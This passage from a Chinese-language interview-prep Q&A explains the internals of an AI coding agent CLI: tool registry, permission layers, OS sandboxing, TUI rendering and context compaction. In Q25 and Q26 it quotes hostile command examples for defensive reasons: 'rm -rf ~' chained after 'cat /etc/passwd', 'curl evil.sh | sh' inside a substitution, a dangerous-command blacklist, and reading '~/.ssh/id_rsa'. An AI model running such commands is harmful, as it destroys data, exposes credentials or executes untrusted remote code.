2. 权限决策：`default` 模式下 read 直接放行、write/command 需询问 —— category 是权限矩阵的输入维度；
3. 安全兜底：注册表查不到的工具按 `command` 处理（最严等级），执行串行、权限询问。

一个字段驱动"并行度、权限严格度、兜底策略"三种行为，是因为这三者对"操作是否有副作用"的判断标准本就一致。把副作用性声明为工具的静态元数据，而不是在执行时动态推断，让各子系统可以独立、廉价地做决策。

---

### Q21：什么是延迟工具（deferred tool）机制？它如何解决"工具过多导致上下文膨胀"的问题？

答：

问题背景：MCP 服务器可能暴露数十上百个工具，若全部 schema 注入系统提示，一次请求的工具描述就能吃掉数万 token，还会稀释模型对核心工具的注意力。

机制（`tools/registry.ts` + `tools/tool-search.ts`）：

1. 标记隐藏：工具可标记 `deferred: true`（所有 MCP 工具默认 `deferred = true`）。`getAllSchemas()` 过滤掉未发现的 deferred 工具 —— 模型初始只看到核心工具 + 一个 `ToolSearch` 工具。
2. 按需发现：模型需要时调用 `ToolSearch`，两种方式：
   - 关键词搜索：`searchDeferred(query)` 对 name/description 做大小写不敏感的 `includes()` 匹配，最多返回 5 个候选的完整 schema；
   - 精确选择：`select:name1,name2` 语法按名直接激活。
3. 发现即注册：`markDiscovered(name)` 把工具加入 `discovered` 集合，后续 `getAllSchemas()` 开始包含它 —— 对模型而言"工具池随需增长"。

本质是把工具列表也当作一种需要分页/搜索的资源，与"工具结果太大要落盘"（Q39 的 applyBudget）同属一个思想：上下文窗口是稀缺资源，一切可延迟加载的都延迟加载。这与前端的代码分割（code splitting）+ 按需 import 在思想上完全同构 —— 初始 bundle（核心工具）最小化，功能模块（deferred 工具）按需加载。

---

### Q22：`fileStateCache` 的"先读后写"门禁是如何实现的？它防御的是什么问题？

答：

`tools/file-state-cache.ts` 维护 `Map<path, mtimeMs>` —— 记录每个文件"最后被本会话读取时的修改时间"：

- `record()`：ReadFile 成功后调用，登记 mtime；
- `check()`：WriteFile/EditFile 执行前的门禁，两种拒绝：
  - 从未读过 → `"file has not been read yet, read it first before editing."`；
  - 磁盘 mtime > 缓存 mtime → `"file has been modified since last read, read it again."`（读完后文件被外部改了）；
- `update()`：写成功后刷新 mtime。

防御两类真实故障：

1. 盲写覆盖：模型凭训练印象直接写它"以为"的文件内容，覆盖掉仓库里的真实代码。强制先读，保证写入基于真实内容。
2. 陈旧上下文编辑（lost update）：EditFile 的 `old_string` 替换依赖"模型看到的版本"，若用户或其他进程在读后改了文件，替换要么失配（好情况）、要么错误命中（灾难）。mtime 校验把这变成了显式失败。

注意它用的是 mtime 乐观锁而非文件锁 —— 不阻止外部修改，只检测并显式失败，把"重新读取"的决定权交回模型。配合 EditFile 内部的唯一性校验（`old_string` 出现 0 次或多次都报错）和 `old_string === new_string` 拒绝，构成了一套轻量但有效的"编辑安全网"。

另外，mtime 检查有刻意的人性化设计：`statSync` 失败（文件在读后被删除）时 `check` 返回 ok —— 让下游的写入逻辑自己报更具体的错，而不是门禁越权报误导性错误。

---

### Q23：EditFile 的 diff 是如何生成的？为什么没有直接用 Myers/LCS 这类通用 diff 算法？

答：

`tools/diff.ts` 用的是公共前后缀裁剪法，而非通用 diff：

1. 正向扫描：找到新旧内容逐行相等的最长公共前缀；
2. 反向扫描：找到最长公共后缀（不与前缀重叠）；
3. 中间夹着的部分：旧文件的为删除块（`-`），新文件的为新增块（`+`）；
4. 变更区上下各附带 `CONTEXT_LINES = 3` 行上下文，总行数超 `MAX_DIFF_LINES = 200` 截断。

为什么够用且更好：EditFile 的变更本质是单点替换 —— `old_string` 替换为 `new_string`，变更区天然连续。公共前后缀法在这种形态下输出与 Myers 完全一致，但：

- 实现约 40 行，零依赖，无 LCS 动态规划的 O(mn) 时空开销；
- 输出格式可控：直接产出 `"{+|-| } {行号:4位} {内容}"` 的统一格式，TUI 的 `DiffLines` 组件按行首字符上色（`+` 绿、`-` 红、其余暗色）；
- 行为确定：通用 diff 的"最小编辑距离"在边界情况会给出反直觉的对齐，前后缀法的结果永远符合"改了一小段"的直觉。

这是典型的"利用问题域约束简化算法"：通用 diff 解决任意两个文本的差异，而这里已知差异必然是单一连续区块，约束条件让简单算法成为最优解。若未来支持多点编辑（多个 old/new 对），才需要升级到真正的 Myers。

---

### Q24：Bash 工具为什么用 `spawnSync` 而不是 `exec`/`spawn`？超时与输出处理怎么做？

答：

`tools/bash.ts` 用 `spawnSync("bash", ["-c", command], { timeout, maxBuffer: 10MB, stdio: pipe })` 同步执行。初看"同步阻塞"是反模式，但在这里是合理选择：

1. 工具执行模型本就是 await 语义：Agent 在 `await tool.execute(...)` 处等待结果，异步只是让出事件循环，逻辑上同样阻塞。而工具的并发调度已由上层（`Promise.all` 并行批）负责 —— 每个工具调用内部的执行方式不影响批间并行度。
2. 同步 API 的语义简单性：`spawnSync` 一次性返回 `{ stdout, stderr, status, signal, error }`，不需要手动拼接流、处理 close/exit 竞态，代码量减半且边界情况（超时杀进程、buffer 超限）由 Node 统一处理。
3. 超时可靠性：`timeout` 参数由 Node 内核实现 SIGTERM 强杀，比手写 `setTimeout + kill()` 少了"进程已退出但定时器未清"等竞态。默认 120s，硬上限 `MAX_TIMEOUT = 600s`。

输出处理：

- stdout/stderr 分别捕获后拼接（不加前缀，避免污染模型对输出的解析）；
- `maxBuffer: 10MB` 是最后防线，真正的体积控制在上层（agent 层 `MAX_OUTPUT_CHARS = 10000` 落盘、budget 层 50KB 单结果落盘）；
- 非零退出码附加语义提示（`exitCodeHint()`）：如 grep 退出码 1 提示"no matches found"、diff 退出码 1 提示"files differ" —— 把 Unix 退出码惯例翻译成模型能理解的自然语言，避免模型把"无匹配"误判为"命令失败"而反复重试。

沙箱包装在执行前：`if (sandbox?.available()) actualCommand = sandbox.wrap(command, config)` —— 见 Q28。

---

## 五、权限系统与 OS 沙箱

### Q25：权限检查器（PermissionChecker）的分层决策管线是怎样的？请按优先级逐层说明。

答：

`permissions/checker.ts` 的 `check()` 是一条短路求值的分层管线，靠前的层更具体、更优先：

- Layer 0 — plan 模式计划文件例外：mode 为 `plan` 且目标是 WriteFile/EditFile 且 `file_path` 含 `.swifty/plans/` → 直接 allow。让模型在只读的计划模式下也能写计划文件，是"模式约束内的合法出口"。
- Layer 2 — 只读命令白名单：command 类工具过 `isSafeCommand()`（见 Q26），命中 → allow。
- Layer 3 — 危险命令黑名单：命中危险模式（如 `rm -rf /`、`git push --force`、fork 炸弹）→ 直接 deny，不问用户 —— 有些操作连"用户误点允许"的风险都不能冒。
- Layer 3.5 — 沙箱自动放行：OS 沙箱可用且命令非危险 → allow。命令将在内核级隔离中运行，即使恶意也伤不到宿主，HITL 询问无增量价值。
- Layer 4 — 路径沙箱（PathSandbox）：文件类工具限定在项目目录 + tmpdir 内；敏感路径（如 `~/.ssh`）在拒绝写名单 → deny/ask。
- Layer 4b — 会话级临时白名单：用户点过"不再询问"的模式存在内存中（进程级，不持久化）→ allow。
- Layer 5 — YAML 规则引擎（RuleEngine）：用户/项目/本地三级 YAML 规则文件，`ToolName(pattern)` 形式的 glob 规则 → 按规则 allow/deny/ask。规则文件每次检查时重新读取，改规则立即生效。
- Layer 6 — 模式矩阵兜底（`modeDecide()`）：`default`（read 放行，write/command 询问）、`acceptEdits`（write 放行，command 询问）、`plan`（write/command 均询问）、`bypassPermissions`（全放行）。

设计原则："例外 → 白名单 → 黑名单 → 环境隔离 → 资源边界 → 用户记忆 → 用户规则 → 模式默认"，从具体到一般排列。任何一层给出确定结论即短路，保证可预测性；同时 allow/deny/ask 三态而非布尔，保留了"询问"这个 HITL 中间态。

---

### Q26：`isSafeCommand()` 的"元字符守卫"是什么？为什么单纯的前缀匹配不安全？

答：

朴素方案是"命令前缀白名单"：`ls`、`cat`、`git status` 等开头即放行。但这有经典注入漏洞 —— `cat /etc/passwd; rm -rf ~` 以 `cat` 开头却执行任意命令；`ls $(curl evil.sh | sh)` 同理。

`isSafeCommand()`（`checker.ts:291`）因此是两阶段检查：

1. 元字符守卫：先扫描整条命令，含 `>`、`|`、`;`、`&&`、`$(`、反引号 任一即直接判定"不安全"（不是拒绝，而是交还给后续权限层询问）。这些 shell 元字符能把"安全前缀"变成任意执行的跳板。
2. 前缀匹配：过了守卫的命令，再与只读命令前缀表匹配（`ls`、`cat`、`git status`、`git log` 等），命中才自动放行。

这是"先验证载体完整性，再验证语义白名单"的纵深防御：前缀匹配回答"这是什么命令"，元字符守卫回答"这条命令串是否纯粹"。单独做任何一个都不安全 —— 只做前缀匹配有注入漏洞；只做元字符守卫则 `cat ~/.ssh/id_rsa` 这类"纯但敏感"的命令会被放行。

对前端工程师的类比：这与 XSS 防御中"先转义再校验"同理 —— 任何"对不可信输入做模式匹配"的场景，都必须先排除组合/转义带来的语义改变。

---

### Q27：权限模式（permission mode）有哪几种？各自语义与典型使用场景是什么？

答：

四种模式构成严格度梯度，TUI 中 Shift+Tab 循环切换（`MODEL_CYCLE = ["default", "acceptEdits", "plan", "bypassPermissions"]`）：

| 模式                | read | write                | command | 场景                                             |
| ------------------- | ---- | -------------------- | ------- | ------------------------------------------------ |
| `default`           | 放行 | 询问                 | 询问    | 日常开发默认，最安全                             |
| `acceptEdits`       | 放行 | 放行                 | 询问    | 信任模型改代码，但命令需把关 —— 适合重构类任务   |
| `plan`              | 放行 | 询问（计划文件除外） | 询问    | 计划模式：模型只能调研和产出计划，退出需用户审批 |
| `bypassPermissions` | 放行 | 放行                 | 放行    | 沙箱环境/容器内全自动执行                        |

两个模式有额外的"行为语义"而不只是权限语义：

- plan 模式是一套完整工作流：进入时保存原模式（`prePlanMode`）；Agent 循环每轮注入 plan 提醒（第 1/5/10... 轮完整版、其余精简版）；模型通过 `ExitPlanModeTool` 结束规划；循环结束时弹出 `PlanApprovalDialog`，用户可选 yolo（切 bypass 执行）/ manual（恢复原模式执行）/ feedback（打回反馈继续规划）。权限模式在这里扮演了状态机的状态。
- bypassPermissions 配合沙箱才有意义：Layer 3.5 的"沙箱自动放行"与 bypass 的区别是 —— 沙箱放行有内核隔离背书，bypass 是裸奔。生产实践中 bypass 应只在容器/VM 中使用。

模式的持久化：`permission_mode` 可写入 YAML 配置作为会话默认值，但"不再询问"的会话白名单只在内存 —— 刻意不持久化，防止一次授权永久生效。

---

### Q28：OS 级沙箱是如何实现的？macOS seatbelt 与 Linux bubblewrap 的差异如何收敛？

答：

`sandbox/index.ts` 定义统一接口 `Sandbox { available(): boolean; wrap(command, config): string }`，工厂 `createSandbox()` 按平台返回实现，`wrap()` 的职责是把原始命令包装成沙箱化命令字符串（bash 工具执行前调用）：

- macOS — seatbelt.ts：生成 sandbox-exec 的 profile（Scheme DSL），策略大致为 `(deny default)` 之上放行进程派生、读取全盘、写入限定目录（项目目录 + tmpdir）、按 `networkEnabled` 决定网络。最终命令变为 `sandbox-exec -p <profile> bash -c <command>`。
- Linux — bwrap.ts：用 bubblewrap 的命名空间隔离，挂载绑定控制文件系统可见性（项目目录 rw、其余 ro 或不可见），`--unshare-net` 控制断网。

差异收敛在两层：

1. 能力模型抽象：统一为 `SandboxConfig { networkEnabled, allowWrite[], denyWrite[] }`，两个后端各自把该模型翻译成自己的规则语言；
2. 可用性探测：`available()` 检测平台与二进制是否存在，不可用时整个沙箱层静默降级 —— bash 工具照常执行，只是失去 Layer 3.5 的自动放行（命令退化为询问用户）。

与权限系统的关系是互补而非替代：权限层是"决策"（要不要执行），沙箱层是"隔离"（执行时伤不到什么）。Layer 3.5 把两者联动 —— "有沙箱背书的无害命令"跳过 HITL，在安全和体验间取得平衡：用户不被频繁打断，而即使模型被注入恶意命令，内核级隔离也限制了爆炸半径（blast radius）。

---

### Q29：假设面试官追问："如果让你设计这个权限系统的下一步演进，你会做什么？" 如何回答才体现深度？

答：

可以从五个方向展开，每个都对应现有设计的真实局限：

1. 规则引擎的表达能力升级：当前 YAML 规则是 glob 匹配 `ToolName(pattern)`，无法表达参数级语义（如"`Bash(npm install *)` 允许但 `Bash(npm publish *)` 拒绝"之外的组合条件）。可引入类似 Cedar/OPA 的策略语言，支持参数解构、正则、组合条件，并附带 `swifty policy test` 的本地规则测试器。
2. 权限审计与回放：当前决策无持久审计日志。应落盘"时间、工具、参数摘要、命中层、决策、用户选择"五元组，配合 `--audit` 回放 —— 企业场景的合规刚需，也为规则调优提供数据。
3. 风险分级询问：当前 ask 是同质化的。可对参数做风险评分（路径敏感度、命令的破坏半径、网络出向），低风险询问可合并批量确认（"允许本次会话所有 npm test 类命令"），减少打断频次。
4. "不再询问"的作用域细化：会话白名单目前是进程级整体。可细化为"本会话/本项目/全局"三档 + 过期时间，并让用户在 `/permission` 命令中可视化管理。
5. 沙箱覆盖度补齐：当前沙箱只包 bash；网络出向控制可上提到 LLM API 之外（MCP server、WebFetch 类工具），形成统一的网络策略面；Windows 平台可用 Job Object + 受限 token 补齐第三后端。

回答这类问题的结构模板：指出现状局限（证明读过代码）→ 给出方案（证明能设计）→ 说明权衡（证明有工程判断力）。

---

## 六、TUI 渲染层与性能优化

### Q30：Ink 的 `<Static>` 组件在 Swifty 中扮演什么角色？`committedIndexRef` 的提交策略是怎样的？

答：

终端渲染有个根本约束：已滚出可视区的内容无法再修改（终端不是 DOM，没有真正的重绘已滚动区域的能力）。Ink 的 `<Static>` 正是为此设计：其子树渲染一次后写入终端回滚缓冲区（scrollback），之后任何 React 更新都不再触碰它，也不参与 `eraseLines` 清屏。

Swifty 把消息列表切成两段（`app.tsx:1688`）：

```tsx
<Static items={messages.slice(0, committedIndexRef.current)}>
  {(item) => <CommittedMessage message={item} />}
</Static>
<ChatView messages={messages.slice(committedIndexRef.current)} streamingText={...} />
```

`committedIndexRef`（用 ref 而非 state，因为它的变化本身不需要触发渲染）是"已提交/未提交"分界线，推进时机：

- `turn_complete`：本轮 turn_summary 落列表后推进 —— 中间过程冻结进回滚区；
- `loop_complete`：assistant 最终正文提交；
- `/clear`：归零；`/resume`：设为恢复的消息数。

收益有三：

1. 零闪烁：历史消息永不重绘，只有动态区（未提交消息 + 流式文本 + spinner + 对话框）在更新；
2. 渲染成本恒定化：无论对话多长，每帧 React 协调的动态子树大小恒定，长会话不退化；
3. 终端语义正确：回滚区内容用户可向上翻阅，且不受后续清屏影响。

类比前端：`<Static>` 之于终端 ≈ `content-visibility: auto` + 虚拟列表之于长页面 —— 都是"把已离开焦点区域的内容从渲染管线上摘除"。

---

### Q31：流式文本的 50ms 节流具体如何实现？为什么不直接用 lodash throttle 或 React 18 的 `useDeferredValue`？

答：

实现（`app.tsx:1316`）：

```ts
case "stream_text":
  fullText += event.text;
  streamingTextRef.current = fullText;
  streamThrottleRef.current ??= setTimeout(() => {
    setStreamingText(streamingTextRef.current);
    streamThrottleRef.current = null;
  }, 50);
```

三个要点：`??=` 保证同一窗口只调度一个定时器（合并窗口内全部 delta）；回调读 `streamingTextRef.current` 而非闭包变量（拿到最新值，见 Q11）；`turn_complete`/`loop_complete` 时显式清定时器并冲刷最终值（保证尾帧不丢）。

为什么不用现成方案：

- lodash throttle 的 trailing 语义：throttle(fn, 50) 的 trailing 调用用的是最后一次调用的参数 —— 但事件处理器里的"参数"就是 event 对象，传参渲染会引入中间态；手写版直接读 ref 快照，语义是"渲染此刻的最新累计值"，更贴合流式场景。且少一个依赖。
- `useDeferredValue`：延迟值仍会在每次 setState 时参与协调，只是低优先级 —— 高频 setState 本身（每秒几十次）就是开销源，节流要消灭的是 setState 次数本身。且 Ink 的渲染目标（终端 diff + ANSI 写入）比 DOM 更新昂贵得多，必须在数据源头限频。
- `useSyncExternalStore` 类方案：Agent 循环是命令式的 `for await`，把事件流转成外部 store 快照再订阅，架构上多一层，收益不如一行 `??=` 直接。

经验：高频事件源 → ref 累积 + 定时器合帧 → 低频 setState，这与浏览器中 scroll/pointermove 的处理套路一致，只是"帧"的定义从 rAF（16ms）放宽到 50ms（终端渲染贵 + 人眼对文本流不敏感）。

---

### Q32：`StreamingText` 组件的"稳定前缀缓存"是什么？它把 markdown 解析的复杂度从多少降到多少？

答：

问题：流式渲染要对文本做 markdown 解析（`marked`），若每帧全量解析累计文本，第 n 帧成本 O(n)，总成本 O(n²) —— 长回复后半段会明显卡顿。

`StreamingText`（`chat.tsx:87`）的解法：

```ts
const boundary = text.lastIndexOf("\n\n");
const stableText = text.slice(0, stableEnd); // 已闭合段落
const unstableText = text.slice(stableEnd); // 尾部进行中的段落
if (stableText.length > stableRef.current.text.length) {
  stableRef.current = {
    text: stableText,
    rendered: renderMarkdown(stableText),
  };
}
const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
```

- 以 `\n\n`（段落边界）把文本切成稳定前缀（段落已闭合，解析结果不会再变）与不稳定尾部（最后一段还在生长）；
- 稳定前缀只有变长时才重解析，结果缓存进 ref；不稳定尾部每帧重解析，但其长度被段落大小限制（通常几十字符）；
- 总成本降为 O(n)（每个字符只被"稳定化"时解析一次），逐帧成本 O（段落长度）。

正确性的关键假设：marked 对"以段落边界切分的前缀"的解析结果与全文解析的前缀部分一致 —— 对绝大多数块级语法成立（`\n\n` 是块级分隔符）。 fenced code block 跨段是已知边界情况，实践中可接受。

另有配套的物理行截断：动态区只渲染能放进终端高度的最后 N 行（预留 12 行给输入框/状态栏等），防止动态区超高触发 Ink 清屏。两个优化一纵（解析）一横（渲染），共同保证长回复的流畅性。

---

### Q33：`app.tsx` 约 1850 行、30+ 个状态，是如何避免变成"巨石组件"失控的？它的状态分层策略是什么？

答：

`app.tsx` 的状态可清晰分为五层，这是它没有失控的根本原因：

1. 渲染态（useState）：`messages`、`streamingText`、`activeTools`、`error` 等 —— 直接驱动视图的；
2. 镜像态（useRef 双写）：`streamingTextRef`、`permModeRef` —— 异步回调需要最新值的（见 Q11）；
3. 边界态（useRef）：`committedIndexRef`、`headerPrintedRef`、`submittingRef`（重入守卫）—— 参与逻辑但不驱动渲染；
4. 服务实例态（useRef）：`clientRef`、`convRef`、`registryRef`、`hookEngineRef`、`teamManagerRef` 等十几个 —— 本质是用 ref 当依赖注入容器：这些对象有方法、有内部状态、生命周期等于会话，放进 ref 既不触发渲染又保证单例；
5. 异步句柄态（useRef）：`permissionResolveRef`、`askResolveRef`、`abortControllerRef`、`streamThrottleRef` —— 跨渲染帧存活的 Promise/定时器句柄。

关键架构选择：领域逻辑不下放为 React 状态。对话历史在 `ConversationManager`（普通类）、工具在 `ToolRegistry`、团队在 `TeamManager` —— React 只是这些领域对象的"投影"。`messages` state 是投影的结果而非事实来源。因此 `app.tsx` 虽长，但长而不乱：每个 ref/state 职责单一，事件循环（`for await`）是唯一的调度主线。

可改进点（面试加分项）：渲染态可用 `useReducer` 收敛（`ask-user-dialog.tsx` 已示范 —— 用 reducer 管理多问题向导的 next/prev/update/set-submit-cursor）；事件循环的 switch 可拆为每事件类型的 handler 映射表。

---

### Q34：输入框（InputBox）在 Ink 里是如何从零实现的？包括光标、多行、历史、自动补全。

答：

Ink 没有 `<input>` 组件，`input.tsx`（574 行）基于 `useInput` 原始按键事件自建了微型文本编辑器：

文本模型：`lines: string[]` + `cursorLine`/`cursorCol` 光标坐标。字符插入是切片拼接 `line.slice(0, col) + input + line.slice(col)`；Shift+Enter/Ctrl+J 在光标处拆行实现多行；光标渲染用 `<Text inverse>` 反色显示光标位字符。粘贴被 Ink 合并为单条含 `\r\n` 的输入，按多字符批量插入处理。

历史召回：上箭头（单行且无下拉时）在 `promptHistory` 中向前游走，下箭头向后，索引归零时清空输入；历史条目按 `\n` 拆分以支持多行召回。

斜杠命令自动补全：五级匹配管道（`useMemo`）—— 精确名 > 精确别名 > 前缀名 > 前缀别名 > Fuse.js 模糊匹配（权重 name:3 / aliases:2 / description:0.5，阈值 0.4）；`CommandUsageTracker` 把最近使用的命令提顶；若输入是最佳匹配的前缀，剩余字符以暗色"幽灵文本"显示在光标后。

@文件展开：行尾出现 `@<partial>` 时弹文件下拉 —— `scanWorkdirFiles()` 递归扫描（跳过 `SKIP_DIRS` 和点文件，上限 2000），结果缓存于 `fileCacheRef`（每次挂载只扫一次）；前缀匹配优先、子串次之，上限 8 条；Tab/Enter 补全为 `@<path> `。

模式切换：检测 Shift+Tab（终端序列为 `\x1b[Z` 或 `key.tab && key.shift`）循环四种权限模式。

性能细节：所有下拉过滤都是 `useMemo`（依赖为 lines/commands/atQuery），文件扫描结果用 ref 缓存 —— 每次按键只重算最小集合。

---

### Q35：`installSyncOutput()` 做了什么？终端"撕裂"问题与浏览器的 vsync 有什么类比？

答：

终端撕裂：Ink 每帧输出包含"光标定位 + 擦除 + 重写"多段 ANSI 序列，若终端模拟器在序列写到一半时刷新屏幕，用户会看到半新半旧的中间帧（闪烁/撕裂）。

`sync-output.ts` 用 DEC 2026 同步输出协议解决：monkey-patch `process.stdout.write`，把所有写入包进 BSU（`\x1b[?2026h`，开始同步更新）/ ESU（`\x1b[?2026l`，结束）信封 —— 支持的终端（iTerm2、WezTerm、Warp、kitty、foot、alacritty、Ghostty、VTE≥6800、Windows Terminal 等）会攒住整帧内容直到 ESU 才一次性上屏。

合帧用 `queueMicrotask`：

```ts
frameBuffer += str;
if (!scheduled) {
  scheduled = true;
  queueMicrotask(() => { originalWrite(BSU + frameBuffer + ESU); ... });
}
```

同一微任务内的所有同步 write 合并为一个信封，成本几乎为零。

能力探测读取 `TERM_PROGRAM`、`TERM`、环境变量白名单，tmux 下禁用（tmux 会吞掉该序列）—— 探测失败时静默不启用，优雅降级。

类比：BSU/ESU 就是终端世界的 vsync / 双缓冲交换 —— 浏览器里你把所有 DOM 修改放进一个 rAF 回调，渲染引擎在垂直同步时一次性合成；这里把所有 ANSI 写入放进一个同步信封，终端在信封闭合时一次性上屏。配套的 `alternate-screen.tsx`（`\x1b[?1049h/l` 切换备用屏幕缓冲区）则类似"离屏画布" —— 程序退出时切回主屏幕，不污染用户的 shell 历史。

---

### Q36：权限对话框、提问向导、计划审批这些交互组件，在键盘交互设计上有哪些共性模式？

答：

三个对话框体现了终端键盘交互的统一模式语言：

1. 选项列表 + 光标 + 回车确认：`PermissionDialog` 三个固定选项（Yes / Yes, don't ask again / No），上下键循环（边界回绕），Enter 选择，Esc 一律视为拒绝 —— 拒绝是零成本默认动作，安全交互的基本原则。
2. 向导模式（多步表单）：`AskUserDialog`（485 行，最复杂）用 `useReducer` 管理 `currentQuestion + answers + submitCursor` 状态机：顶部导航条展示问题页签（`☑/☐` 标记已答）；上下键选选项、Tab/左右键切问题、数字键直跳选项、空格切换多选、"Other"进入自由文本；答完进入 Submit 页复核。单问题非多选时隐藏 Submit 页、选完即提交 —— 按复杂度自适应流程长度。
3. 破坏性操作的双段确认：计划审批三选项（yolo / manual / feedback），Esc 默认落到最保守的 manual；反馈文本用 Shift+Tab 提交避免与 Enter 冲突。
4. 统一的中断语义：所有对话框期间 Ctrl+C/Esc 都有明确含义（拒绝/取消），与全局 Ctrl+C 双击退出（`ctrlCCountRef` + 2 秒窗口计数器）分层：对话框消费优先，冒泡到全局的是"无对话框时"的退出。

把对话框实现为"注入给 Agent 的 Promise 工厂 + 键盘状态机组件"（见 Q12），业务侧永远只看到 `await ask(...)` —— 交互复杂度被完全封装在组件内部。

---

### Q37：团队/子代理的实时进度在 UI 上如何呈现？为什么团队状态用轮询而不是事件驱动？

答：

两条路径：

- 子代理（in-process）：`AgentTool` 的 spawn 回调给每个子代理分配单调递增 id，`onProgress({turn, lastTool})` 回调直接 `setSubagents(...)` —— 同进程，可直接事件驱动，渲染为动态区的品红进度行（`label · turn N · lastTool`）。
- 团队 teammate（可能跨进程）：`app.tsx:317` 每 500ms 轮询 `TeamManager.getAllTeammateStates()`，渲染为 `TeammateSpinnerTree` 进度树 + 状态栏 `TeamStatus` 徽标。

团队用轮询的原因：

1. 跨进程边界：teammate 可以是独立子进程（甚至 tmux 窗口），状态经由文件系统传递（进度文件/JSONL 邮箱），文件系统没有可靠的跨进程事件机制（fs.watch 在 macOS/Linux 行为不一、对追加写不敏感），轮询是唯一可移植语义。
2. 简单性与韧性：轮询天然容忍 teammate 崩溃（状态文件停更即显示停滞）、重启、乱序写入 —— 事件驱动需要处理丢失、重复、乱序，轮询每次读到的是全量快照，幂等。
3. 500ms 是体验与开销的平衡点：人眼对进度更新的感知阈值约 200-500ms，500ms 轮询感知流畅，而 `statSync` 几个小文件的开销可忽略。

这呼应整体哲学：主线用生成器（AgentEvent），旁路按传输介质选择最合适的机制 —— 进程内用回调，跨进程用轮询。

---

### Q38：如果面试官问"这个 TUI 还有哪些性能隐患，你会怎么优化？"，可以从哪些点展开？

答：

基于已有实现，可讨论的点：

1. `messages` 数组的全量 slice：每帧 `messages.slice(0, committed)` / `slice(committed)` 产生两个新数组，消息上千时是 O(n) 分配。可改为只传 `(messages, committedIndex)` 让子组件内部切片，或对 Static 区改为"追加式"API（Ink 的 Static 本就只认新 item，可用版本号比对）。
2. turn_summary 之前的中间渲染：工具执行期间 `activeTools` 每次状态变化都整体重渲染动态区。`ToolDisplay` 已是 memo 友好结构，可进一步给每个 ToolBlock 加 `React.memo` + 稳定 key（toolId）。
3. markdown 渲染的双通道：`StreamingText` 缓存了稳定前缀，但 `MessageBlock`（assistant 提交后）会再次全量解析同一文本 —— 提交时可把已解析结果随消息传递，避免提交瞬间的一次全量重解析。
4. 文件扫描缓存的失效策略：`fileCacheRef` 在 InputBox 生命周期内不失效，长会话中新建文件无法被 `@` 补全。可加 mtime 失效或定时刷新。
5. 500ms 团队轮询可升级为混合模式：in-process teammate 直接回调，仅跨进程回退轮询 —— `detectBackend()` 当前永远返回 `"in-process"`，恰有条件做此优化。
6. 大输出的字符串成本：工具结果拼接到消息 content 是 O(n) 字符串复制，超长会话下 GC 压力可观；可考虑结构化存储（消息只持引用，渲染时物化）。

回答框架仍然是：定位真实瓶颈（引用具体机制）→ 给出方案 → 说明为什么当前不急着做（YAGNI / 收益成本比）—— 这才体现工程判断力而非背优化清单。

---

## 七、上下文管理与压缩

### Q39：上下文管理的"两道防线"是什么？为什么必须先 applyBudget 再 compact？

答：

Agent 循环每轮在调用 LLM 之前，按序执行两道防线（`agent.ts:182-203`）：

Layer 1 — `applyBudget()`（`tool-result/budget.ts`，廉价、无损）：就地修剪超大工具结果：

- Pass 1：单个 toolResult 超过 `SINGLE_RESULT_LIMIT = 50000` 字符 → 全文写入 `.swifty/sessions/{id}/tool_results/{toolUseId}`，原位置替换为 2000 字符预览 + 文件路径（模型需要时可 ReadFile 读回）；
- Pass 2：一条消息内全部 toolResult 聚合超 `MESSAGE_AGGREGATE_LIMIT = 200000` → 按大小降序逐个落盘直到达标；
- 幂等保护：已替换的（`[Result of ` 前缀）跳过；`isSpillReadback()` 防止"读回落盘文件的结果再次被落盘"的无限循环。

Layer 2 — `manageContext()`（`compact/compact.ts`，昂贵、有损）：估算 token 超过自动阈值才触发，用 LLM 生成摘要重写历史（见 Q40）。

顺序的原因：budget 是"显式冗余消除"，compact 是"语义有损压缩"。工具结果大是最常见的上下文膨胀源（日志、构建输出），把它们落盘是无损的（原文可回读），应先做；只有无损手段仍不够时，才动用会丢失细节的摘要压缩。压缩后还会再跑一次 budget —— 新保留的尾部里可能仍有大结果。

这与前端性能优化同理：先压缩图片/删 dead code（无损），再上 tree-shaking 激进的语义化精简（有损）—— 降本手段按"无损 → 有损"排序。

---

### Q40：压缩（compact）算法完整流程是怎样的？保留尾部、摘要、恢复三件套如何协同？

答：

触发阈值（`computeCompactThreshold()`）：

```
effectiveWindow = contextWindow - min(maxOutput, SUMMARY_OUTPUT_RESERVE=20000)
autoThreshold   = effectiveWindow - 13000   （自动触发）
hardBlock       = effectiveWindow - 3000    （强制触发，无视熔断器）
```

以 200K 窗口、8192 输出为例：auto = 178808，hard = 188808 —— 预留约 21K 给"摘要请求本身的输入余量 + 输出空间"。

保留尾部计算（`computeKeepStartIndex()`）：从消息尾部向前累加，满足"≥10K token 或 ≥5 条消息"即停，上限 40K token —— 最近的对话原文保留，避免纯摘要的"传话游戏"信息衰减。工具对保护：若边界恰好把 tool_use 和 tool_result 切开，`backUpPastToolUse()` 继续向前找到对应的 assistant 消息，保证配对完整（孤儿 tool_result 会被 API 拒绝）。退化保护：可摘要前缀不足 `MIN_COMPACT_PREFIX = 2` 条时放弃压缩。

摘要生成：9 段式结构化提示词（用户意图、关键技术概念、文件与代码片段、错误与修复、问题解决过程、全部用户消息、待办任务、当前工作、下一步建议含原文引用），要求模型先输出 `<analysis>` 打草稿再输出 `<summary>`。

PTL 重试：摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()` 捕获 PTL 错误后按"API 轮"分组丢弃最旧消息（按需丢弃：计算 token 缺口丢够为止；否则丢 1/5），最多 3 次。

恢复附件（`recovery.ts`）：压缩后追加 recovery attachment —— 最近读过的 5 个文件（各截断至 5K token）、活跃技能（共 25K token 预算）、可用工具清单 —— 因为摘要可能丢掉"刚读过的文件内容"这类工作记忆。

三件套协同：保留尾部保近期精度，摘要保远期脉络，恢复附件保工作记忆 —— 对应人类记忆的短时记忆、长时记忆、工作记忆三层。

另有熔断器：连续 3 次压缩失败则暂停自动压缩（除非达到 hardBlock 强制）。

---

### Q41：token 估算为什么用 `chars / 3.5`？这个数字的误差如何处理？

答：

`CHARS_PER_TOKEN = 3.5`（`compact.ts:28`）是英文代码/文本混合语料下 Claude tokenizer 的经验均值（英文约 4，代码符号密集略低，取保守值使估算偏大而宁早勿晚）。

估算函数 `estimateMessages()` 对每条消息累加 `content.length + JSON.stringify(toolUses).length + ΣtoolResults + Σthinking`，再除以 3.5 向上取整。

误差处理策略：

1. UsageAnchor 校准（见 Q18）：每轮 API 响应的真实 usage 作为锚点，字符估算只覆盖锚点后的增量 —— 误差窗口被压缩到一两轮内；
